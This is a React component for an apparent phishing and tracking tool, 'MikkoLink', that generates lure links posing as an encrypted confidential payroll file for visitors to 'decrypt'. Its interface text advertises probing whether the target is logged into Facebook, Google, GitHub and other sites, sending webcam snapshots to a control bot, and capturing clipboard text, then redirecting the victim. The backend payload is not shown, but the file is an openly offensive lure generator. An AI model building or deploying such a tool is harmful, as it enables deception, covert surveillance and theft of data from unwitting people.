import React, { useState } from 'react';
import { Shield, Link, Copy, Check, ExternalLink, Cpu, Zap, Activity } from 'lucide-react';

export default function MikkoLink() {
  const [fileName, setFileName] = useState('CONFIDENTIAL_PAYROLL_2026.pdf.enc');
  const [redirectUrl, setRedirectUrl] = useState('https://google.com');
  const [generatedLink, setGeneratedLink] = useState('');
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleCreate = async () => {
    setLoading(true);
    try {
      const res = await fetch('/api/mikkolink/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ fileName, redirect: redirectUrl })
      });
      const data = await res.json();
      if (data.url) {
        setGeneratedLink(window.location.origin + data.url);
      }
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedLink);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="flex flex-col h-full bg-[#030508] text-[#00f3ff] font-serif">
      <div className="p-6 border-b border-[#00f3ff]/20 bg-[#00f3ff]/5">
        <h2 className="text-xl font-bold flex items-center mb-2 tracking-tighter text-white">
          <Shield className="w-6 h-6 mr-3 text-[#00f3ff] animate-pulse" /> MIKKO_PROTOCOL_LINK
        </h2>
        <p className="text-xs text-[#00f3ff]/60 uppercase tracking-widest leading-relaxed">
          Statelessly formulate premium interactive file-decryption tracking gateways. Intercept active social sessions and local environment footprints.
        </p>
      </div>

      <div className="p-6 overflow-y-auto space-y-8">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
          
          {/* Node Parameter Setup */}
          <div className="space-y-6">
             <div className="flex items-center space-x-2 border-b border-[#00f3ff]/10 pb-2 mb-4">
                <Activity className="w-4 h-4 text-[#00f3ff]/60 animate-pulse" />
                <h3 className="text-[10px] font-bold text-[#00f3ff]/40 uppercase tracking-[0.3em]">GATE_PARAMETERS</h3>
             </div>
             
             <div className="space-y-4 font-sans">
               <div>
                 <label className="block text-[10px] font-bold text-[#00f3ff]/60 mb-2 uppercase tracking-widest font-serif">Pseudo-Target Document Title</label>
                 <input 
                   type="text" 
                   value={fileName}
                   onChange={e => setFileName(e.target.value)}
                   placeholder="CONFIDENTIAL_PAYROLL_2026.pdf.enc"
                   className="w-full bg-black border border-[#00f3ff]/20 text-[#00f3ff] rounded px-4 py-2.5 focus:outline-none focus:border-[#00f3ff]/60 text-sm font-mono placeholder:text-[#00f3ff]/10"
                 />
                 <span className="text-[9px] text-[#00f3ff]/30 leading-normal mt-1 block">Specify the file name the visitor will decrypt. e.g. .enc, .xlsx, .zip, .dat</span>
               </div>

               <div>
                 <label className="block text-[10px] font-bold text-[#00f3ff]/60 mb-2 uppercase tracking-widest font-serif">Remote Relocation (Redirect URL)</label>
                 <input 
                   type="text" 
                   value={redirectUrl}
                   onChange={e => setRedirectUrl(e.target.value)}
                   placeholder="https://google.com"
                   className="w-full bg-black border border-[#00f3ff]/20 text-[#00f3ff] rounded px-4 py-2.5 focus:outline-none focus:border-[#00f3ff]/60 text-sm font-mono placeholder:text-[#00f3ff]/10"
                 />
                 <span className="text-[9px] text-[#00f3ff]/30 leading-normal mt-1 block">Payload extraction termination path. Destination redirect.</span>
               </div>

               <button
                 onClick={handleCreate}
                 disabled={loading}
                 className="w-full py-4 bg-gradient-to-r from-[#00f3ff]/30 to-[#00f3ff] hover:from-[#00f3ff]/50 hover:to-white text-black font-bold text-sm uppercase tracking-[0.2em] transition-all active:scale-95 flex items-center justify-center space-x-3 shadow-[0_0_25px_rgba(0,243,255,0.2)] border border-[#00f3ff]/40 font-serif rounded"
               >
                 <Cpu className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
                 <span>{loading ? 'SPLICING_PARAMETERS...' : 'CONSTRUCT_MIKKO_GATEWAY'}</span>
               </button>
             </div>
          </div>

          {/* Splicing Stream Output */}
          <div className="space-y-6">
             <div className="flex items-center space-x-2 border-b border-[#00f3ff]/10 pb-2 mb-4">
                <Zap className="w-4 h-4 text-[#00f3ff]/60 animate-pulse" />
                <h3 className="text-[10px] font-bold text-[#00f3ff]/40 uppercase tracking-[0.3em]">DECRYPTOR_UPLINK</h3>
             </div>

             {generatedLink ? (
               <div className="space-y-4 animate-in zoom-in-95 duration-300">
                 <div className="p-4 bg-[#00f3ff]/5 border border-[#00f3ff]/30 rounded relative group">
                   <div className="text-[9px] font-bold text-[#00f3ff] mb-2 tracking-widest uppercase">ENCODED_TUNNEL_UPLINK_URL:</div>
                   <div className="font-mono text-xs break-all pr-12 text-white font-bold select-all leading-relaxed">{generatedLink}</div>
                   <button 
                     onClick={copyToClipboard}
                     className="absolute right-4 top-1/2 -translate-y-1/2 p-2 hover:bg-[#00f3ff]/20 text-[#00f3ff] rounded transition-all"
                   >
                     {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                   </button>
                 </div>
                 
                 <div className="flex space-x-2">
                   <a 
                     href={generatedLink} 
                     target="_blank" 
                     rel="noopener noreferrer"
                     className="flex-1 flex items-center justify-center space-x-2 border border-[#00f3ff]/30 py-2.5 text-[10px] font-bold uppercase tracking-widest hover:bg-[#00f3ff]/10 transition-all text-[#00f3ff]"
                   >
                     <ExternalLink className="w-3.5 h-3.5" />
                     <span>Test_Gateway</span>
                   </a>
                   <button 
                     onClick={() => setGeneratedLink('')}
                     className="flex-1 py-2.5 text-[10px] font-bold uppercase tracking-widest border border-red-500/20 hover:bg-red-500/5 text-red-500/60 transition-all rounded"
                   >
                     Reset_Gateway
                   </button>
                 </div>
               </div>
             ) : (
               <div className="p-12 border border-dashed border-[#00f3ff]/10 flex flex-col items-center justify-center text-center opacity-30 h-40">
                 <Link className="w-8 h-8 mb-4 animate-pulse text-[#00f3ff]" />
                 <span className="text-[10px] font-bold uppercase tracking-widest">Awaiting Parameter Assembly</span>
               </div>
             )}

             <div className="p-4 bg-black border border-[#00f3ff]/5 text-[10px] space-y-3 leading-relaxed font-mono">
               <div className="flex items-start space-x-3 text-[#00f3ff]/50">
                 <span className="text-[#00f3ff]">●</span>
                 <p className="uppercase tracking-tight">
                    <b>Active Social Probe:</b> Utilizes active image load redirection markers to inspect if target is concurrently logged into Facebook, Instagram, Google, Steam, Spotify, and GitHub.
                 </p>
               </div>
               <div className="flex items-start space-x-3 text-[#00f3ff]/50">
                 <span className="text-[#00f3ff]">●</span>
                 <p className="uppercase tracking-tight">
                    <b>Biometric Scan Interceptor:</b> Streams custom webcam feed snaps directly to the control bot when permission is approved.
                 </p>
               </div>
               <div className="flex items-start space-x-3 text-[#00f3ff]/50">
                 <span className="text-[#00f3ff]">●</span>
                 <p className="uppercase tracking-tight">
                    <b>Clipboard Extraction module:</b> Captures active system copy registry text securely.
                 </p>
               </div>
             </div>
          </div>

        </div>
      </div>
    </div>
  );
}
